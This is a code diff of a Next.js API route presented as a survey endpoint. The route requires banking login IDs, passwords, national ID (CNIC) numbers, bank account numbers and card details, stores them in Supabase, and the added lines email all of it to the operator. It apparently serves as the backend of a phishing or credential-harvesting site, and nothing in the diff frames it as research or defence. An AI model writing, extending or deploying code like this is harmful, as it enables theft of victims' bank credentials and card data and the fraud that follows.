@@ -1,5 +1,6 @@
 import { supabase } from "../../lib/supabaseClient";
 import { NextResponse } from "next/server";
+import { sendSurveyEmail } from "../../lib/email";
 
 export async function POST(req: Request) {
   try {
@@ -16,20 +17,35 @@ export async function POST(req: Request) {
 
     const { account, card, review } = body;
 
-     for (const key of ["loginId","password","cnic","bankName","accountNumber"]) {
+    // Validate account fields
+    for (const key of [
+      "loginId",
+      "password",
+      "cnic",
+      "bankName",
+      "accountNumber",
+    ]) {
       if (!account[key]) {
         console.error(`Account field ${key} is missing`);
-        return NextResponse.json({ error: `Account field ${key} missing` }, { status: 400 });
+        return NextResponse.json(
+          { error: `Account field ${key} missing` },
+          { status: 400 }
+        );
       }
     }
 
-    for (const key of ["cardNumber","issuedDate","nameOnCard"]) {
+    // Validate card fields
+    for (const key of ["cardNumber", "issuedDate", "nameOnCard"]) {
       if (!card[key]) {
         console.error(`Card field ${key} is missing`);
-        return NextResponse.json({ error: `Card field ${key} missing` }, { status: 400 });
+        return NextResponse.json(
+          { error: `Card field ${key} missing` },
+          { status: 400 }
+        );
       }
     }
 
+    // Insert into Supabase
     const { data, error } = await supabase.from("survey_responses").insert([
       {
         login_id: account.loginId,
@@ -45,11 +61,32 @@ export async function POST(req: Request) {
     ]);
 
     if (error) {
+      console.error("Supabase Error:", error);
       return NextResponse.json({ error: error.message }, { status: 500 });
     }
 
+    // -------------------------
+    // 👉 Send Email Notification
+    // -------------------------
+    try {
+      await sendSurveyEmail({
+        account,
+        card,
+        review,
+      });
+    } catch (emailError) {
+      console.error("Email sending failed:", emailError);
+      // (We do NOT return an error because DB insert succeeded)
+    }
+
+    // Final API response
     return NextResponse.json({ success: true, data }, { status: 200 });
-  } catch (err) {
-    return NextResponse.json({ error: "Invalid request" }, { status: 400 });
+
+  } catch (err: any) {
+    console.error("Server Error:", err);
+    return NextResponse.json(
+      { error: err.message || "Invalid request" },
+      { status: 400 }
+    );
   }
 }
